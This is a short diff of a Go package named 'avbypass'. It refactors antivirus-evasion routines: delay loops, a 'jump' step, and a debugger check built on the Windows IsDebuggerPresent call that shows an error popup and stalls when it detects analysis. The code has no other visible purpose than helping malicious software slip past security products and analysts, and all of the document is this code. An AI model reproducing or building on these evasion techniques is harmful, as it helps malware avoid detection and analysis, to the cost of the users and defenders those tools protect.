@@ -1,12 +1,12 @@
 package avbypass
-
+import "../utils"
 var magicNumber int64
 
 // TODO wait til user clicks
 
 func BypassAV() {
-	LongLoop()
-	Jump()
+	longLoop()
+	jump()
 	//Wait()
 	checkDebugger()
 }
@@ -22,10 +22,10 @@ func longLoop() {
 }
 
 func checkDebugger() {
-	Flag, _, _ := IsDebuggerPresent.Call()
+	Flag, _, _ := utils.IsDebuggerPresent.Call()
 	if Flag != 0 {
-		Run("msg * Error")
-		Wait()
+		utils.Run("msg * Error")
+		utils.Wait(120)
 		checkDebugger()
 
 	}
